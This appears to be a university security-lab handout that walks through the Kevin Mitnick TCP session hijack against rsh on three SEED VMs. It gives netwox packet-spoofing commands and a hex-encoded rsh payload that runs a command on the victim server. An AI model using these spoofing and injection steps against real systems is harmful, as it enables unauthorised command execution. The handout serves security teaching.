# Kevin Mitnick Attack

## Instructions
(From Jidong Xiao's CS333 Class at Boise State University. To be used with 3 SEED Ubunutu 16.04 machines on the same virtual network)

The Kevin Mitnick Attack 

Requirement: In this demo, we will demonstrate the Kevin Mitnick attack - a special case of the TCP session hijack attack. Instead of hijacking an existing TCP connection between victims A and B, the Mitnick attack creates a TCP connection between A and B first on their behalf, and then naturally hijacks the connection. Specifically, Kevin Mitnick created and hijacked rsh connections. In this demo, the attacker's goal is to create a file /tmp/xyz on the victim server machine.

Setup: 3 Linux VMs. VM1 as the victim client; VM2 as the victim server; VM3 as the attacker. The 3 VMs reside in the same network - in the original Kevin Mitnick attack, the attacker's machine was not in the same network. Back then TCP sequence numbers were easily predictable, today it is not. To simulate the attack and simplify our task, we assume we still know the sequence numbers - we will, in the demo, obtain the sequence numbers from wireshark. We will then use "netwox 40" to perform packet spoofing. In the following document, we assume the victim client's IP is 10.0.2.15, and the victim server's IP is 10.0.2.10.

Background knowledge: In rsh, two TCP connections are needed. One for normal communication, the other for sending error messages. In the first connection, client port must be 1023, server port must be 514. In the second connection, server port must be 1023, client port can be anything - let's choose 9090 for example.

Steps:

Preparation steps: 

step 1. installing rsh on client, server, and the attacker's machine. Run the following two commands on all 3 VMs:

`sudo apt-get install rsh-redone-client`

`sudo apt-get install rsh-redone-server`

step 2. configure rsh on the victim server machine.

`$ touch .rhosts`

`$ echo [victim client’s IP address] > .rhosts (replace "victim client's IP address" with the actual IP address)`

`$ chmod 644 .rhosts`

If the above configuration is correct, you should be able to run below command on the victim client machine, and it will show you current date information.

`rsh [victim server’s IP] date`

step 3. simulating the syn flooding attack.
3.1 on the victim server, run:

`sudo arp -s [victim client’s IP] [victim client’s MAC]`

This step is needed so that the server remembers the MAC address of the client, which is needed for the server to send packets to the client.

3.2 shutdown the victim client VM or disconnect its network.

step 4. turn on wireshark on the attacker's VM and start capturing.

Attacking steps:

step 1: create the first TCP connection. 

step 1.1: On the attacker's VM, send a spoofed SYN packet to the victim server.

`sudo netwox 40 --tcp-syn --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514`

step 1.2: right after the above command, netwox would show us the sequence number of this SYN packet, let's say it's x. Then in wireshark, identify the SYN-ACK packet coming from the victim server to the victim client and find out its sequence number, let's say it's y. Now we send the ACK packet to complete the TCP 3-way handshake.

`sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1`

step 1.3: send one ACK packet to the server. This packet carries the command we want to run:

`sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1 --tcp-data "393039300073656564007365656400746f756368202f746d702f78797a00"`

step 2: create the second TCP connection. After the above ACK packet, the server would automatically sends a SYN packet to the client so as to establish the 2nd TCP connection. We just need to respond a fake SYN-ACK packet. Let's say the sequence number of this SYN packet is z, then in our SYN-ACK packet, the ack num needs to be z+1, the sequence number can be anything.

step 2.1: 

`sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 9090 --tcp-dst 1023 --tcp-acknum z+1`

Verification steps:

step 1: on the victim's server machine, see if /tmp/xyz is created.

==============

Note: In netwox 40, --tcp-data specifies the data you want to transfer, and in our case, we want to transfer an rsh command "touch /tmp/xyz". In rsh, its data's structure is:

`[port number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00`

thus, in order to inject a command "touch /tmp/xyz", the data we should inject is "9090\x00seed\x00seed\x00touch /tmp/xyz\x00", and then we need to convert it into hex numbers:

`$ python
>>> "9090\x00seed\x00seed\x00touch /tmp/xyz\x00".encode("hex")
'393039300073656564007365656400746f756368202f746d702f78797a00'`

Note 2: In the attacking steps, right after step 1.1, we need to run step 1.2 as soon as possible, otherwise the server will RESET the 1st TCP connection; similarly, right after step 1.3, we need to run step 2.1 as soon as possible, otherwise the server will RESET the 2nd TCP connection. Therefore, writing a sniifing-and-spoofing script would be the better way to perform this attack.

Alternatively, we can run these two commands on the server so that it does not RESET that fast.

`sudo sysctl -w net.ipv4.tcp_syn_retries=20`
`sudo sysctl -w net.ipv4.tcp_synack_retries=20`
